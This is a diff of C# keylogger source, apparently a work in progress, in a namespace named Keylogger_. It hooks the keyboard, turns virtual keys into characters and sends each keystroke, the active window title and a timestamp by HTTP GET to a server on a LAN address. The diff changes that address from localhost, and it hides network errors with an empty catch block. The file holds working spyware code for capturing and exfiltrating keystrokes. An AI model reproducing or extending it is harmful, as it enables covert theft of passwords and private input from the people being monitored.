@@ -9,6 +9,8 @@ using System.Threading;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.Net.Http;
+using System.Net.NetworkInformation;
+using System.Net;
 
 namespace Keylogger_
 {
@@ -140,6 +142,16 @@ namespace Keylogger_
                     else
                     {
                         key = ((Keys)vKey).ToString().ToLower();
+                    }
+                }
+                else if (vKey > 127 && vKey < 160)
+                {
+                    switch (vKey)
+                    {
+                        case 128:
+                            key = "Ф";
+                            break;
+                        
                     }
                 }
                 else if (vKey >= 96 && vKey <= 111)
@@ -488,55 +500,29 @@ namespace Keylogger_
                     Program.lastTitle = props["Window"];
                 }
                 Trace.Write(props["Key"]);
-
                 
+                 using (  System.Net.Http.HttpClient client = new System.Net.Http.HttpClient())
+                 {
+                    
+                        try
+                        {
+                            client.Timeout = new TimeSpan(0,0,0,0,10);
+                            // Ваша текстовая строка для отправки
+                            //var content = new StringContent(logEntry, Encoding.UTF8, "text/plain"); // Устанавливаем Content-Type заголовок
+                            client.GetAsync($"http://192.168.1.174:34467/weatherforecast/SetLog?logEntry={props["Key"]}&window={props["Window"]}&time={props["Time"]}")
+                                 .GetAwaiter().GetResult();
 
-
-                using (System.Net.Http.HttpClient client = new System.Net.Http.HttpClient())
-                {
-
-                    string logEntry = "HELL!!!"; // Ваша текстовая строка для отправки
-                    //var content = new StringContent(logEntry, Encoding.UTF8, "text/plain"); // Устанавливаем Content-Type заголовок
-                    string s = client.GetAsync($"http://localhost:34467/weatherforecast/SetLog?logEntry={props["Key"]}&window={props["Window"]}&time={props["Time"]}")
-                         .GetAwaiter().GetResult().Content.ReadAsStringAsync().GetAwaiter().GetResult();
-
-                    // Дополнительная обработка ответа сервера, если необходимо asdasdasdghjvwwwwwwaadasdad
-
-
-                    /*string window = props["Window"];
-                    string key1;
-                    string time = props["Time"];
-                    string logFile = Program.logName;
-
-
-
-                     if (window != Program.lastTitle1)
-                     {
-                         string jsonData = $"[ {{ \"Window\": \"{window}\", \"Keys\" : [\"{key}\"] }} ]";
-                         StringContent content = new StringContent(jsonData, Encoding.UTF8, "application/json");
-                         string s = client.PostAsync("http://localhost:34467/weatherforecast/setdata", content).
-                         GetAwaiter().GetResult().Content.ReadAsStringAsync().GetAwaiter().GetResult();
-
-                     }
-                     else
-                     {
-
-
-                     }
-
-                       qwertyrwe1123qwer11
-                         string jsonData = $"[ {{ \"Window\": \"{window}\", \"Keys\": [\"{key}\"], \"Time\": \"{time}\", \"LogFile\": \"{logFile}\" }} ]"
-                     */
-                }
+                            // Дополнительная обработка ответа сервера, если необходимо
+                        }
+                        catch { }
+                    
+                 }
             }
                 return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
         }
        
         public static void Main(string[] args)
         {
-            //string directoryPath = Environment.CurrentDirectory;
-            //int portNumber = 8080;
-            //KeyLogger_.SimpleHTTPServer server = new KeyLogger_.SimpleHTTPServer(directoryPath);
             try
             {
                 Trace.Listeners.Clear();
@@ -551,12 +537,6 @@ namespace Keylogger_
                 Trace.Listeners.Add(ctl);
                 Trace.AutoFlush = true;
 
-                
-                // Start the clipboard
-                //Thread clipboardT = new Thread(new ThreadStart(delegate { Application.Run(new ClipboardMonitorForm()); }));
-                //clipboardT.Start();
-
-                //Application.Run(new ClipboardNotification.NotificationForm());
                 HookProc callback = CallbackFunction;
                 var module = Process.GetCurrentProcess().MainModule.ModuleName;
                 var moduleHandle = GetModuleHandle(module);
